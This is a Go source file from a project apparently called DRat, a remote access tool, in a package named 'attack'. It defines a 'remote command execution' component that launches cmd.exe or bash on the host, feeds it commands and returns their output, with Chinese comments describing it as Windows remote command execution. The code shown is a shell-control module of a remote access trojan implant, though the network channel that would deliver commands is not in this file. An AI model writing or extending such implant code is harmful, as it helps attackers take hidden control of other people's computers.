/*
 * @Author: SpenserCai
 * @Date: 2023-03-01 10:07:41
 * @version:
 * @LastEditors: SpenserCai
 * @LastEditTime: 2023-03-06 14:39:37
 * @Description: file content
 */
package attack

// 基于windows的远程命令执行
import (
	DRatUtil "DRat/util"
	"fmt"
	"io"
	"os/exec"
	"runtime"
	"strings"
)

// 实现一个远程命令执行的功能，初始化时启动一个cmd，然后通过Write和Read来进行交互，函数调用传入命令并执行，返回执行结果
type DRce struct {
	cmd       *exec.Cmd
	CmdStdin  io.WriteCloser
	CmdStdout io.ReadCloser
	Status    bool
}

// 初始化远程命令执行
func (rce *DRce) Init() error {
	if runtime.GOOS == "windows" {
		rce.cmd = exec.Command("cmd.exe")
	} else {
		rce.cmd = exec.Command("bash")
	}
	var err error
	rce.CmdStdin, err = rce.cmd.StdinPipe()
	if err != nil {
		return err
	}
	rce.CmdStdout, err = rce.cmd.StdoutPipe()
	if err != nil {
		return err
	}
	err = rce.cmd.Start()
	if err != nil {
		return err
	}
	// 清空cmd的输出
	output := ""
	if runtime.GOOS == "windows" {
		for {
			buf := make([]byte, 1024)
			n, err := rce.CmdStdout.Read(buf)
			if err != nil {
				break
			}
			output += string(buf[:n])
			if string(buf[n-1]) == ">" {
				break
			}
		}
		fmt.Println(DRatUtil.ConvertByte2String([]byte(output), DRatUtil.GB18030))
	}

	rce.Status = true
	return nil
}

// 执行远程命令
func (rce *DRce) Run(cmd string) (string, error) {
	_, err := rce.CmdStdin.Write([]byte(cmd + "\n"))
	if err != nil {
		return "", err
	}
	// 持续读取cmd的输出直道结束符
	output := ""
	for {
		buf := make([]byte, 1024)
		n, err := rce.CmdStdout.Read(buf)
		if err != nil {
			break
		}
		output += string(buf[:n])
		if runtime.GOOS == "windows" && string(buf[n-1]) == ">" {
			break
		} else if runtime.GOOS != "windows" && buf[n-1] == 10 {
			break
		}
	}
	// 判断是否是windows
	if runtime.GOOS == "windows" {
		// 转换编码
		output = DRatUtil.ConvertByte2String([]byte(output), DRatUtil.GB18030)
		// 如果第一行是命令本身，那么就去掉
		// 读取第一行
		firstLine := strings.Split(output, "\n")[0]
		// 判断第一行是否是命令本身
		if strings.Contains(firstLine, cmd) {
			// 去掉第一行
			output = strings.Join(strings.Split(output, "\n")[1:], "\n")
		}
	} else {
		// 如果第一行是命令本身，那么就去掉
		// 读取第一行
		firstLine := strings.Split(output, "\n")[0]
		// 判断第一行是否是命令本身
		if strings.Contains(firstLine, cmd) {
			// 去掉第一行
			output = strings.Join(strings.Split(output, "\n")[1:], "\n")
		}
	}
	return output, nil
}

// 关闭远程命令执行
func (rce *DRce) Close() error {
	rce.Status = false
	err := rce.cmd.Process.Kill()
	if err != nil {
		return err
	}
	return nil
}

var Rce = &DRce{Status: false}
